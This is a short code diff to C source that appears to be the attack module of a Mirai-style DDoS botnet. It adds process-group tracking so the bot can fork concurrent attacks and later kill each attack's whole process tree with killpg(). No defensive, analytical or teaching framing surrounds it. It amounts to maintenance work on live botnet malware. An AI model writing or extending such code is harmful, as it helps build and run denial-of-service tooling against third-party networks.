@@ -18,6 +18,7 @@ extern void attack_autobypass(uint8_t, struct attack_target *, uint8_t, struct a
 uint8_t methods_len = 0;
 struct attack_method **methods = NULL;
 int attack_ongoing[ATTACK_CONCURRENT_MAX] = {0};
+pid_t attack_pgids[ATTACK_CONCURRENT_MAX] = {0};
 BOOL attack_init(void)
 {
     int i;
@@ -68,8 +69,15 @@ void attack_kill_all(void)
     for (i = 0; i < ATTACK_CONCURRENT_MAX; i++)
     {
         if (attack_ongoing[i] != 0)
+        {
             kill(attack_ongoing[i], 9);
+            if (attack_pgids[i] != 0)
+            {
+                killpg(attack_pgids[i], 9);
+            }
+        }
         attack_ongoing[i] = 0;
+        attack_pgids[i] = 0;
     }
 }
 void attack_parse(char *buf, int len)
@@ -234,6 +242,7 @@ void attack_start(int duration, ATTACK_VECTOR vector, uint8_t targs_len, struct 
 {
     int pid1, pid2;
     int i;
+    pid_t pgid;
     pid1 = fork();
     if (pid1 == -1)
         return;
@@ -244,11 +253,16 @@ void attack_start(int duration, ATTACK_VECTOR vector, uint8_t targs_len, struct 
             if (attack_ongoing[i] == 0)
             {
                 attack_ongoing[i] = pid1;
+                pgid = getpgid(pid1);
+                if (pgid > 0)
+                    attack_pgids[i] = pgid;
                 break;
             }
         }
         return;
     }
+    setpgid(0, 0);
+    pgid = getpgid(0);
     pid2 = fork();
     if (pid2 == -1)
     {
